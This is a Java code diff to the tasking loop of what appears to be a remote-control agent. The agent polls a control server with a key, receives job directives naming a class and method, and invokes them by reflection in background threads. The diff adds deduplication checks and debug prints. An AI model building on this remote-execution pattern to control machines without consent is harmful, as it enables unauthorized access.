@@ -4,12 +4,16 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.security.NoSuchAlgorithmException;
 import java.util.Hashtable;
+import java.util.Set;
 
 public class Proc {
 	public static void taskify(String taskID) {
 		Hashtable schtask = new Hashtable();
 		schtask.put("status","wait");
-		Main.schtasks.put(taskID,schtask);
+		if (!Main.schtasks.containsKey(taskID)) {
+			Main.schtasks.put(taskID,schtask);
+		}
+
 	}
 	
 	public static Hashtable retrieve(String pkgName,String method) throws NoSuchMethodException, SecurityException {
@@ -30,14 +34,23 @@ public class Proc {
 	}
 	
 	public static void ingest() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
+                final Exception starterStackTrace = new Exception();
 		Hashtable agentDirective = Netw.send("Ctrl", null, Main.config.get("ctrlKey").toString(), Crypt.bake());
+                System.out.println(agentDirective);
+		if (agentDirective.containsKey("error")) {
+			return;
+		}
+		
 		String taskID = agentDirective.get("jobID").toString();
-		if (!Main.taskManifest.contains(taskID)) {
+                System.out.println(Main.taskManifest);
+                System.out.println(Main.schtasks);
+ 		if (!Main.taskManifest.contains(taskID) && !Main.schtasks.containsKey(taskID)) {
 			Main.taskManifest.add(taskID);
 			String pkgName = agentDirective.get("pkgName").toString();
 			String pkgMeth = agentDirective.get("pkgMeth").toString();
 			
 			if (Util.distant(pkgName) == 0) {
+                                System.out.println("class not on agent");
 				Hashtable errorTable = new Hashtable();
 				errorTable.put("status","complete");
 				errorTable.put("class",pkgName);
@@ -49,6 +62,7 @@ public class Proc {
 				Hashtable dirDescriptor = retrieve(pkgName,pkgMeth);
 				Runnable methodRuntime = new Runnable() {
 					public void run() {
+
 						try {
 							//Hashtable dirResult = (Hashtable) ((Method) directiveCall.get("method")).invoke((Class) directiveCall.get("class"),dirArgs);
 							Hashtable dirResult = (Hashtable) ((Method) dirDescriptor.get("method")).invoke(Hashtable.class,agentDirective);
@@ -59,10 +73,11 @@ public class Proc {
 							Main.schtasks.put(taskID,dirResult);
 						} catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
 							e.printStackTrace();
-						}
+                                                }
 						
 					}
 				};
+                                System.out.println("made runnable");
 				needle(methodRuntime);
 			}			
 		}
